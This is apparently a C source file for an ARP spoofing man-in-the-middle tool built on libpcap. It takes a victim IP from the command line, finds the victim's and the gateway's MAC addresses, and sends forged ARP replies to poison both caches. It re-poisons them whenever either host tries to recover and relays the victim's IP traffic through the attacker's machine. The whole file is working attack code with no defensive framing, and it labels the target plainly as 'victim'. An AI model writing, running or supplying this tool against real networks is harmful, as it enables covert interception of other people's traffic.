#include<stdio.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<net/if.h>
#include<string.h>
#include<sys/ioctl.h>
#include<ifaddrs.h>
#include<unistd.h>
#include<stdlib.h>
#include<time.h>


char* getmyip(char *dev ){
	struct ifaddrs *ifap, *ifa;
	struct sockaddr_in *sa;
	
	char* addr;
	addr = (char*)calloc(1, INET_ADDRSTRLEN);
	

	if ( getifaddrs(&ifap) == -1){
		return 0;
	}

	for(ifa = ifap; ifa;ifa = ifa -> ifa_next){

		if(ifa->ifa_addr->sa_family==AF_INET){
			sa = (struct sockaddr_in *) ifa->ifa_addr;
			inet_ntop(AF_INET, &(sa->sin_addr),addr,INET_ADDRSTRLEN);

			if(ifa->ifa_name == dev){
			break;
			}
		}	

	}
	return addr;

}


unsigned char* getmyMAC(char *pIface){
	int nSD;
	struct ifreq sIfReq;
	struct if_nameindex *pIfList;
	struct if_nameindex *pListSave;

	unsigned char* cMacAddr;
	cMacAddr = (unsigned char*)calloc(6, sizeof(unsigned char));

	pIfList = (struct if_nameindex *) NULL;
	pListSave = (struct if_nameindex *) NULL;

	nSD = socket (PF_INET, SOCK_STREAM, 0);
	
	if( nSD < 0){
		return 0;
	}

	pIfList = pListSave = if_nameindex();

	for( pIfList ; *(char *)pIfList !=0; pIfList++)
	{
		if( strcmp(pIfList->if_name, pIface)) continue;

	
		strncpy(sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE);
		if (ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0){
			return 0;
		}
	
		memmove( (void *)&cMacAddr[0], (void *)&sIfReq.ifr_ifru.ifru_hwaddr.sa_data[0], 6);
		break;

	}

	if_freenameindex( pListSave);
	close(nSD);
	
	return cMacAddr;

}

struct ethernet{
	u_int8_t  ether_dhost[6];
	u_int8_t  ether_shost[6];
	u_int16_t ether_type;                 

};

struct ARP{
	u_int16_t Hardware_type;
	u_int16_t Protocol_type;
	u_int8_t Hardware_size;
	u_int8_t Protocol_size;
	u_int16_t Opcode;
	u_int8_t shost_MAC[6];
	u_int8_t shost_ip[4];
	u_int8_t dhost_MAC[6];
	u_int8_t dhost_ip[4];
};

struct IP{
	u_int8_t ip_hdr_len:4;
	u_int8_t ip_ip_version:4;
	u_int8_t ip_tos;
	u_int16_t ip_len;
	u_int16_t ip_id;
	u_int16_t ip_off;
	u_int8_t ip_ttl;
	u_int8_t ip_proto;
	u_int16_t ip_chk;
	u_int8_t ip_src[4];
	u_int8_t ip_dst[4];
};



struct send_data{
	struct ethernet eth;
	struct ARP arp;

};

#define ARP_REPLY  2
#define ARP_REQUEST 1
#define UNI_REQUEST 3

//if arp_reply, send_MAC changes position with target_MAC.

int SendARP(pcap_t *handle, unsigned char *send_MAC, unsigned char *target_MAC, char *send_ip, char *target_ip, int type){
	
	struct send_data data;
	struct sockaddr_in conv_ip;

	unsigned char data1[sizeof(send_data)];

	if (type == ARP_REQUEST) for(int i = 0; i < 6; i++) data.eth.ether_dhost[i]=0xff;
	else if(type == ARP_REPLY) for(int i = 0; i < 6; i++) data.eth.ether_dhost[i]=target_MAC[i];
	else if(type == UNI_REQUEST) for(int i = 0; i < 6; i++) data.eth.ether_dhost[i]=target_MAC[i];
	else return -1;

	for(int i = 0; i < 6; i++) data.eth.ether_shost[i]=send_MAC[i];
	data.eth.ether_type=htons(0x0806);
	data.arp.Hardware_type=htons(0x0001);
	data.arp.Protocol_type=htons(0x0800);
	data.arp.Hardware_size=0x06;
	data.arp.Protocol_size=0x04;

	if (type == ARP_REQUEST || type == UNI_REQUEST)data.arp.Opcode=htons(0x0001);
	else if(type == ARP_REPLY) data.arp.Opcode=htons(0x0002);
	else return -1;

	for(int i = 0; i < 6; i++) data.arp.shost_MAC[i]=send_MAC[i];

	inet_aton(send_ip, &conv_ip.sin_addr);
	for(int i = 0; i < 4; i++) data.arp.shost_ip[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));

	if (type == ARP_REQUEST || type == UNI_REQUEST) for(int i = 0; i < 6; i++) data.arp.dhost_MAC[i]=0x00;
	else if(type == ARP_REPLY) for(int i = 0; i < 6; i++) data.arp.dhost_MAC[i]=target_MAC[i];
	else return -1;

	inet_aton(target_ip, &conv_ip.sin_addr);
	for(int i = 0; i < 4; i++) data.arp.dhost_ip[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
	
	
	memcpy(data1, &data, sizeof(send_data));

	pcap_sendpacket(handle, data1, sizeof(send_data)); 

	return 0;
}

u_int8_t* getyourMAC(pcap_t * handle, unsigned char *MAC, char *send_ip, char *target_ip){
	
	struct pcap_pkthdr *header;
	const u_char *pkt_data;	
	
	ethernet *eth_hdr;
	ARP *arp_hdr;

	time_t start, end;
	int check = 0;
	double dif = 0;

	u_int8_t* yourMAC;
	yourMAC = (u_int8_t*)calloc(6, sizeof(u_int8_t));
	struct sockaddr_in conv_ip;
	u_int8_t ipaddress[4];	

	while(check == 0)
	{		
		SendARP(handle, MAC ,NULL, send_ip, target_ip, ARP_REQUEST);
		time(&start);

		while(1)
		{
			int i, res;
			res = pcap_next_ex(handle, &header, &pkt_data);
			time(&end);
			dif = difftime(end, start);

			if( dif > 1 ) break;  // if it occurs time-out, try to re-send arp packet.

			if(res <= 0) continue;

			eth_hdr = (ethernet*)pkt_data;
			if((ntohs(eth_hdr->ether_type))==0x0806){
				arp_hdr = (ARP*)(eth_hdr + 1);
				if(ntohs(arp_hdr->Opcode)==0x0002){
					inet_aton(send_ip, &conv_ip.sin_addr);
					for(i = 0; i < 4; i++){
						ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
						if(ipaddress[i] != arp_hdr->dhost_ip[i]) continue;
					}
			
					inet_aton(target_ip, &conv_ip.sin_addr);
					for(i = 0; i < 4; i++){
						ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
						if(ipaddress[i] != arp_hdr->shost_ip[i]) continue;
					}

					for(i=0; i<6; i++) {
						yourMAC[i] = arp_hdr->shost_MAC[i];
					}
				check = 1;
				break;
				}
			}	
		}
	}	
	return yourMAC;
}

char* GetGatewayForInterface(const char* interface){
	char* gateway = NULL;
	FILE* fp = popen("netstat -rn", "r");
	char line[256]={0x0};

	while(fgets(line, sizeof(line), fp) != NULL)
	{
		char* destination;
		destination = strndup(line, 15);

		char* iface;
		iface = strndup(line + 73, 4);

		if(strcmp("0.0.0.0        ",destination) == 0 && strcmp(iface, interface) == 0){
			gateway = strndup(line + 16, 15);		
		}

		free(destination);
		free(iface);

	}
	pclose(fp);
	return gateway;

}

#define IN_TO_OUT 1
#define OUT_TO_IN 2

int data_relay(pcap *handle, const u_char *pkt_data, unsigned char *chan_send_mac, unsigned char *chan_target_mac, char *rev_from_ip, int direction){

	ethernet *eth_hdr;
	IP *ip_hdr;

	eth_hdr = (ethernet*)pkt_data;
	ip_hdr = (IP*)(eth_hdr + 1);

	struct sockaddr_in conv_ip;
	u_int8_t ipaddress[4];

	// arp check in find_arp_request function.

	if(ntohs(eth_hdr->ether_type)!=0x0800) return -1;
	
	
	if(direction == 1){
		inet_aton(rev_from_ip, &conv_ip.sin_addr);
		for(int i = 0; i < 4; i++){
			ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
			if(ipaddress[i] != ip_hdr->ip_src[i]) return -1;
		}
	}
	else if(direction == 2){
		inet_aton(rev_from_ip, &conv_ip.sin_addr);
		for(int i = 0; i < 4; i++){
			ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
			if(ipaddress[i] != ip_hdr->ip_dst[i]) return -1;
		}

	}
	else return -2;

	unsigned char* data1;

	data1 = (unsigned char*)calloc(ntohs(ip_hdr->ip_len)+14, 1);

	memcpy(data1, pkt_data, ntohs(ip_hdr->ip_len)+14);
	
	eth_hdr = (ethernet*)data1;
	ip_hdr = (IP*)(eth_hdr + 1);
	
	for(int i =0; i < 6; i++){
		eth_hdr->ether_dhost[i] = chan_target_mac[i];
		eth_hdr->ether_shost[i] = chan_send_mac[i];
	}

	pcap_sendpacket(handle, data1, ntohs(ip_hdr->ip_len)+14); 
	free(data1);

	return 0;

}

void printf_mac(unsigned char *MAC){
	for(int i= 0; i < 6; i++){
		printf("%02X ",MAC[i]);
	}
	printf("\n");

}

int find_arp_request(const u_char *data, unsigned char *send_mac, unsigned char *target_mac, char *target_ip){

	ethernet *eth_hdr;
	ARP *arp_hdr;

	eth_hdr = (ethernet*)data;
	arp_hdr = (ARP*)(eth_hdr + 1);

	struct sockaddr_in conv_ip;
	u_int8_t ipaddress[4];

	if(ntohs(eth_hdr->ether_type)!=0x0806) return -2;

	if(target_mac == NULL){
		for(int i = 0; i < 6; i++){ 
			if( eth_hdr->ether_shost[i] != send_mac[i] ) return -1;
			if( eth_hdr->ether_dhost[i] != 0xff ) return -1;
		}

		inet_aton(target_ip, &conv_ip.sin_addr);

		for(int i = 0; i < 4; i++){
			ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
			if(ipaddress[i] != arp_hdr->dhost_ip[i]) return -1;
		}
	
	return 0; // broadcast.	
	
	}
	else{
		for(int i = 0; i < 6; i++){ 
			if( eth_hdr->ether_shost[i] != send_mac[i] ) return -1;
			if( eth_hdr->ether_dhost[i] != target_mac[i] ) return -1;
		}

		inet_aton(target_ip, &conv_ip.sin_addr);

		for(int i = 0; i < 4; i++){
			ipaddress[i]= ((conv_ip.sin_addr.s_addr & (0xff << (i * 8))) >> (i * 8));
			if(ipaddress[i] != arp_hdr->dhost_ip[i]) return -1;
		}

	return 1; // unicast recovery.
	}

	return -1; // fail
}

int main(int argc, char **argv){
	pcap_t *handle;
	char *dev;
	char errbuf[10000];
	int res;

	unsigned char* myMacAddr;
	u_int8_t *victimMAC=NULL; 
	u_int8_t *gatewayMAC=NULL;
	

	if(argc != 2){
		printf("error.\n");
		return -2;
	}

	char *myaddr;
	char *gatewayip=NULL;

	u_char packet[100];

	dev = pcap_lookupdev(errbuf);
	handle = pcap_open_live(dev, 10000, 1, 1000, errbuf);

	if(handle == NULL){
		printf("Couldn't open device.\n");
		return -1;
	}

		
	myaddr = getmyip(dev);
	myMacAddr = getmyMAC(dev);
	gatewayip = GetGatewayForInterface(dev);
	victimMAC = getyourMAC(handle, myMacAddr, myaddr, argv[1]);
	gatewayMAC = getyourMAC(handle, myMacAddr, myaddr, gatewayip);	

	printf("My mac: ");
	printf_mac(myMacAddr);

	printf("Victim mac: ");
	printf_mac(victimMAC);

	printf("Gateway mac: ");
	printf_mac(gatewayMAC);


	struct pcap_pkthdr *header;
	const u_char *pkt_data;	


	SendARP(handle, myMacAddr, victimMAC, gatewayip, argv[1],ARP_REPLY);
	SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip ,ARP_REPLY);

	while(1){
		res = pcap_next_ex(handle, &header, &pkt_data);

		if(res <= 0 ) continue;
		
		if(find_arp_request(pkt_data, victimMAC ,myMacAddr, gatewayip) >=0 ) {
			SendARP(handle, myMacAddr, victimMAC, gatewayip,argv[1],ARP_REPLY);
			printf("victim unicast recover type: %d\n", find_arp_request(pkt_data, victimMAC ,myMacAddr, gatewayip));	
		continue;
		}
		
		
		if(find_arp_request(pkt_data, victimMAC ,NULL, gatewayip) >=0 ) {
			SendARP(handle, myMacAddr, victimMAC, gatewayip, argv[1], UNI_REQUEST);
			SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip, UNI_REQUEST);
			/*
			SendARP(handle, myMacAddr, victimMAC, gatewayip,argv[1],ARP_REPLY);
			//SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip ,ARP_REPLY);
			*/
			printf("victim broadcast recover type: %d\n", find_arp_request(pkt_data, victimMAC ,NULL, gatewayip));
		continue;
		}

		if(find_arp_request(pkt_data, gatewayMAC , myMacAddr, argv[1]) >= 0) {
			SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip, ARP_REPLY);
			printf("gateway unicast recover type: %d\n", find_arp_request(pkt_data, gatewayMAC ,myMacAddr, argv[1]));
		continue;
		}

		if(find_arp_request(pkt_data, gatewayMAC ,NULL, argv[1]) >= 0) {
			SendARP(handle, myMacAddr, victimMAC, gatewayip,argv[1],UNI_REQUEST);
			SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip, UNI_REQUEST);			
			/*SendARP(handle, myMacAddr, victimMAC, gatewayip,argv[1],ARP_REPLY);
			SendARP(handle, myMacAddr, gatewayMAC, argv[1], gatewayip ,ARP_REPLY);*/
			printf("gateway broadcast recover type: %d\n", find_arp_request(pkt_data, gatewayMAC ,NULL, argv[1]));
		continue;
		}

		data_relay(handle, pkt_data, myMacAddr, gatewayMAC, argv[1], 1);
		data_relay(handle, pkt_data, myMacAddr, victimMAC, argv[1], 2);
		
	}

	/*
	for(int i = 0; i < 100; i++){
		SendARP(handle, myMacAddr, victimMAC, gatewayip,argv[1],ARP_REPLY);
		printf("%d send arp-reply packet.\n",i+1);
		sleep(1);
	}
	*/

	
	free(myMacAddr);
	free(victimMAC);
	free(myaddr);

//	pthread_t thread_t;

//	pthread_create(&thread_t, NULL, time_out, NULL);
//	pthread_join(&thread_t, NULL);
// thread timeout.
	

}
